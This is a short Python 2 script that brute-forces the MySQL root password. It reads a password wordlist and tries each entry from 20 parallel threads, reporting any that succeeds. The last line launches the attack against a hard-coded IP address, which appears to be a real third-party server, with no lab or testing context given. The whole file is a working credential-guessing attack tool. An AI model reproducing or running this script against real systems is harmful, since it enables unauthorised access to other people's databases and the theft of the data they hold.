import pymysql
import time
import signal
import sys
import threading
import thread

def exit_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)

signal.signal(signal.SIGINT, exit_handler)

def loadDictionary(path):
    d = open(path,"r")
    return d.readlines()


def mysqlDictAttack(host,dic,user="root",db='',threadnumber=20):
    print "Starting attack with ",threadnumber, " of threads"
    entries = loadDictionary(dic)
    ctx = {}
    ctx['counter']=0
    ctx['found']=False
    threads=[]
    lock = threading.Lock()
    t=None
    try:
        for i in range(threadnumber):
            print "Creating cracker thread"
            t=Worker(host,user,ctx,lock,entries,i)
            t.daemon=True
            t.start()
            threads.append(t)
        #Workaround to join problem and sigints...
        while True:
            if not any([thread.isAlive() for thread in threads]):
                break
            else:
                time.sleep(1)
    except KeyboardInterrupt:
        print "Received keyboard interrupt"
        for t in threads:
            t.kill_received=True


class Worker(threading.Thread):
    def __init__(self,host,user,ctx,lock,entries,numberthread):
        super(Worker, self).__init__()
        self.host=host
        self.user=user
        self.ctx=ctx
        self.lock=lock
        self.entries=entries
        self.numberthread=numberthread
        self.kill_received=False
    
    def run(self):
        entry_length=len(self.entries)
        
        while self.ctx['counter'] < entry_length-1 and not self.kill_received:
            with self.lock:
                self.ctx['counter'] = self.ctx['counter'] + 1
                if self.ctx['found']:
                    return
            
            entry = self.entries[self.ctx['counter']]
            entry = entry.rstrip()
            try:
                connection = pymysql.connect(host=self.host,
                                    user=self.user,
                                    password=entry,
                                    db='',
                                    charset='utf8mb4',
                                    cursorclass=pymysql.cursors.DictCursor)
                connection.close()
                with self.lock:
                    print "Connection successfull: ", entry
                    self.ctx['found']=True
            except Exception as e:
                with self.lock:
                    if "is not allowed to connect to this MySQL server" in str(e):
                        print "Cannot login from this ip"
                        sys.exit(0)
                    print "Failed for passwd: ", entry, " thread ", self.numberthread
    

mysqlDictAttack("46.242.211.50","dict1.txt",threadnumber=20)

